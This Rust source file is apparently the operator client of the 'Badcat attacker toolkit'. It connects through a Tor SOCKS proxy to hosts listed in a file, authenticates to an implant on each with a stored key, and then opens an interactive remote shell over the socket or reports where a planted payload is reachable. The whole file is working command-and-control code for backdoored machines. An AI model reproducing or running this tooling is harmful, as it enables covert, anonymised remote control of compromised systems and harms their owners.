mod setting;

extern crate clap;

use setting::Setting;

use std::io::{Read, Write};
use std::net::TcpStream;
use std::collections::HashMap;
use std::{error, io, path, thread, time};

use badcat_lib::io::pipe_io;
use clap::{App, Arg};
use socks::Socks5Stream;
use dialoguer::{theme::ColorfulTheme, Select};

struct CliArguments {
    /// address of socks server 
    socks_address: String,
}

struct CommandParser {
    /// cli arguments received
    cli_args: CliArguments,

    /// list of setting objects representing each host
    hosts: Vec<Setting>,

    /// tells whether or not the command parser should
    /// stop from running
    _stopped: bool,

    /// registered handlers
    _handlers: HashMap<&'static str, &'static CommandHandler>
}

struct CommandHandler {
    name: &'static str,
    handler: fn (&mut CommandParser) -> Result<(), Box<dyn error::Error>>,
}

fn main() -> Result<(), Box<dyn error::Error>> {
    let matches = App::new("Badcat attacker toolkit")
        .arg(
            Arg::with_name("hosts")
                .short("-f")
                .long("--hosts-file")
                .help("Sets hosts file")
                .takes_value(true)
                .required(true),
        )
        .arg(
            Arg::with_name("tor_socks_address")
                .short("-t")
                .long("--socks-addr")
                .takes_value(true)
                .default_value("127.0.0.1:9050")
                .help("Sets a custom tor socks address"),
        )
        .get_matches();

    println!("{}", ascii_art());

    let hosts_file = path::PathBuf::from(matches.value_of("hosts").unwrap());
    let socks_address = matches.value_of("tor_socks_address").unwrap();

    let cli_args = CliArguments {
        socks_address: String::from(socks_address),
    };

    let settings = setting::from(&hosts_file)?;
    let mut cmd_parser = CommandParser::from(cli_args, settings);

    cmd_parser.register(&CommandHandler {
        name: "connect",
        handler: do_connect,
    });

    cmd_parser.register(&CommandHandler {
        name: "exit",
        handler: do_exit
    });

    while cmd_parser.is_alive() {
        if let Err(err) = cmd_parser.interact() {
            error(format!("{:?}", err))?;
        }
    }

    Ok(())
}

impl CommandHandler {
    fn call(&self, parser: &mut CommandParser) -> Result<(), Box<dyn error::Error>> {
        let handler = self.handler;
        handler(parser)
    }
}

impl CommandParser {
    fn from(cli_args: CliArguments, hosts: Vec<Setting>) -> CommandParser {
        CommandParser {
            cli_args,
            hosts,
            _stopped: false,
            _handlers: HashMap::new()
        }
    }

    fn interact(&mut self) -> Result<(), Box<dyn error::Error>> {
        let options: Vec<&&str> = self._handlers.keys().collect();

        let selection: usize = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Action")
            .default(0)
            .items(&options[..])
            .interact()?;

        let name = options[selection];
        let cmd_handler: &CommandHandler = self._handlers[name];
        
        cmd_handler.call(self)?;

        Ok(())
    }

    fn stop(&mut self) {
        self._stopped = true;
    }

    fn is_alive(&self) -> bool {
        !self._stopped
    }

    fn register(&mut self, handler: &'static CommandHandler) {
        self._handlers.insert(handler.name, handler);
    }
}

fn info(text: String) -> io::Result<usize> {
    let theme = &ColorfulTheme::default();

    let text = format!("[+] {}", text);
    let output = format!("{}\n", theme.defaults_style.apply_to(text));

    io::stderr().write(output.as_bytes())
}

fn warning(text: String) -> io::Result<usize> {
    let theme = ColorfulTheme::default();

    let text = format!("[?] {}", text);
    let output = format!("{}\n", theme.prompt_style.yellow().apply_to(text));

    io::stderr().write(output.as_bytes())
}

fn success(text: String) -> io::Result<usize> {
    let theme = &ColorfulTheme::default();

    let output = format!("{} {}\n", theme.success_prefix, theme.values_style.apply_to(text));

    io::stderr().write(output.as_bytes())
}

fn error(text: String) -> io::Result<usize> {
    let theme = &ColorfulTheme::default();

    let output = format!("{} {}\n", theme.error_prefix, theme.error_style.apply_to(text));

    io::stderr().write(output.as_bytes())
}

fn do_exit(
    parser: &mut CommandParser
) -> Result<(), Box<dyn error::Error>> {
    success("fair well".to_owned())?;
    parser.stop();
    Ok(())
}

fn do_connect(
    parser: &mut CommandParser
) -> Result<(), Box<dyn error::Error>> {
    let options: Vec<String> = parser.hosts.iter().map(|h| {
        format!(
            "{{\n\tName: '{}'\n\tWithPayload: {}\n\tAddress: {}... }}",
            h.name,
            h.uses_payload,
            &h.address[..16])
    }).collect();

    let selection: usize = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Choose the host")
        .items(&options[..])
        .interact()?;

    let target = &parser.hosts[selection];

    if let Ok(mut stream) = connect_to(target, &parser.cli_args.socks_address) {
        match authenticate(&mut stream, target) {
            Ok(succeeded) => {
                if succeeded {
                    if target.uses_payload {
                        success(
                            format!(
                                "payload should be accessible now at: {}:{}",
                                target.address,
                                target.payload_port,
                            )
                        )?;
                    } else {
                        bind_shell(stream).unwrap_or_else(|_| {
                            //
                        });
                        info("connection closed.".to_owned())?;
                    }
                } else {
                    info("not authenticated to host, maybe your hosts file was corrupted".to_owned())?;
                }
            },
            Err(err) => {
                error(format!("problem authenticating: {:?}", err))?;
            }
        }
    };

    Ok(())
}

fn connect_to(
    setting: &setting::Setting,
    socks_address: &str,
) -> Result<TcpStream, Box<dyn error::Error>> {
    let max_attempts = 5;
    let mut attempt = 0;

    while attempt < max_attempts {
        info(
            format!("trying to connect (attempt {})...", attempt)
        )?;

        match Socks5Stream::connect(
            socks_address,
            String::from(format!("{}:80", &setting.address)).as_str(),
        ) {
            Ok(s) => {
                let tcp_stream = s.into_inner();
                info(
                    format!("connected to: {:?}", tcp_stream.peer_addr()?)
                )?;
                return Ok(tcp_stream);
            },
            Err(err) => {
                error(
                    format!("problem connecting: {:?}", err)
                )?;
                info("sleeping 10s...".to_owned())?;
                thread::sleep(time::Duration::from_secs(10));
            }
        };

        attempt += 1;
    }

    error("could not connect to host".to_owned())?;

    Err(format!("problem connecting to host: {:?}", &setting.address).into())
}

fn authenticate(
    stream: &mut TcpStream,
    setting: &setting::Setting
) -> Result<bool, Box<dyn error::Error>> {
    let buf = setting.key.as_bytes();

    if let Err(err) = stream.write(&buf) {
        return Err(err.into());
    }

    if let Err(err) = stream.flush() {
        return Err(err.into());
    }

    let mut reply = [0];
    if let Err(err) = stream.read_exact(&mut reply) {
        return Err(err.into());
    }

    Ok(reply[0] == 1)
}

fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
    info("opening the default badcat shell...".to_owned())?;
    warning("after exit the shell, keep pressing Enter until it ends".to_owned())?;
    println!("");
    println!("");

    let stream_reader = stream.try_clone()?;
    let stream_writer = stream.try_clone()?;

    // read from socket, write to stdout
    let in_thread = pipe_io(stream_reader, io::stdout());

    // read from stdin, write to socket
    let out_thread = pipe_io(io::stdin(), stream_writer);

    in_thread.join().unwrap();
    out_thread.join().unwrap();

    Ok(())
}

fn ascii_art() -> &'static str {
    r#"
▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
█  ▄    █      █      ██       █      █       █
█ █▄█   █  ▄   █  ▄    █       █  ▄   █▄     ▄█
█       █ █▄█  █ █ █   █     ▄▄█ █▄█  █ █   █  
█  ▄   ██      █ █▄█   █    █  █      █ █   █  
█ █▄█   █  ▄   █       █    █▄▄█  ▄   █ █   █  
█▄▄▄▄▄▄▄█▄█ █▄▄█▄▄▄▄▄▄██▄▄▄▄▄▄▄█▄█ █▄▄█ █▄▄▄█  
    "#
}